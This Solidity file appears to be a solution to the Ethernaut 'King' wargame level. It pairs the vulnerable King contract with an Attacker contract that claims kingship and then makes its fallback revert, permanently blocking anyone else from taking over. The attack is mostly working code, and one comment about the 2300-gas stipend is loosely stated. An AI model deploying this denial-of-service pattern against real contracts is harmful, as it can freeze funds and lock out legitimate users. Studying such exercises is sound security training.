// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

/*The contract below represents a very simple game: 
whoever sends it an amount of ether that is larger than the current prize becomes the new king. 
On such an event, the overthrown king gets paid the new prize, making a bit of ether in the process! 
When you submit the instance back to the level, the level is going to reclaim kingship. 
You will beat the level if you can avoid such a self proclamation.*/
//0xAAA258f4Da8B9d6Dc122e447e1E4e8185039BbbD
//0xB83088Db6b3a15925CEeE1AaC9fd82965d4b43d3

contract King {

  address king;
  uint public prize;
  address public owner;

  constructor() payable {
    owner = msg.sender;  
    king = msg.sender;
    prize = msg.value;
  }

  receive() external payable {
    require(msg.value >= prize || msg.sender == owner);
    payable(king).transfer(msg.value);
    king = msg.sender;
    prize = msg.value;
  }

  function _king() public view returns (address) {
    return king;
  }
}

//solution:
//  send eth from contract and exclude the possibility to receive funds from King contract
//  Important: contract-to-contract TX has a default gas: 2300, not enough to change the storage

contract Attacker {

  address public _target;
  address _owner;
  bool public _receive;

  constructor(address target) {
    _target = target;
    _owner = msg.sender;
    _receive = true;
  }

  function deposit() public payable {

  }

  fallback() external payable {
    if(!_receive) {
      revert();
    }
  }

  function turnOff() public OnlyOwner {
    _receive = false;
  }

  function turnOn() public OnlyOwner {
    _receive = true;
  }

  function hack(uint256 amount) public {
    payable(_target).call{gas: 3000000, value: amount}("");
  }

  modifier OnlyOwner() {
    require(msg.sender == _owner, "Only Ownder may do this.");
    _;
  }
}